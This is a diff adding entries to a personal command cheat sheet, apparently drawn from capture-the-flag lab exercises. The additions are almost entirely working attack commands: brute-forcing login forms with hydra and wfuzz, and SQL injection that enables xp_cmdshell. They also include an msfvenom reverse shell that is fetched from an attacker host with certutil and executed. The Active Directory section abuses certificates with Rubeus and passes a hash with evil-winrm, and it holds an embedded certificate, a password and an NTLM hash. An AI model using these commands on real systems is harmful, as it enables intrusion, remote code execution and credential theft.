@@ -2005,3 +2005,49 @@ deactivate
 virtualenv -p /usr/bin/python2.7 (dir) #creating new env with specific python version
 
 pip install -r requirements.txt
+
+crunch 3 3 0123456789ABCDEF -o 3digits.txt
+
+hydra -l '' -P 3digits.txt -f -v 10.10.146.22 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+
+ cewl -d 2 -m 5 -w passwords.txt http://10.10.135.83 --with-numbers
+
+ cewl -d 0 -m 5 -w usernames.txt http://10.10.135.83/team.php --lowercase
+
+ wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.135.83/login.php -d "username=FUZZ&password=FUZ2Z"
+
+
+ cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq -c | sort -r | head -n 10
+
+ grep "frostlings.bigbadstash.thm" access.log | cut -d '=' -f2 | cut -d ' ' -f1 | head -n 5
+
+grep "frostlings.bigbadstash.thm" access.log | cut -d '=' -f2 | cut -d ' ' -f1 | base64 -d
+
+cut -d ' ' -f2 access.log | sort | uniq -c | wc -l
+
+
+' union select @@version -- #sql version check query
+----------------------------------------------------
+http://10.10.169.200/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.25.139 LPORT=4444 -f exe -o reverse.exe
+
+It's time to use our stacked query to call xp_cmdshell and execute the certutil.exe command on the target to download our payload.
+
+http://10.10.169.200/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
+
+http://10.10.169.200/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.9.25.139:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
+
+http://10.10.169.200/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
+
+----------------------------------------------------
+#abusing ad  #tgt #domainabuse #powerview #powershell #keberos tgt generation
+
+Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
+
+.\Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"4yQwePZ0pZeNZmNA" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
+
+evil-winrm -i 10.10.57.198 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
+
+----------------------------------------------------
+
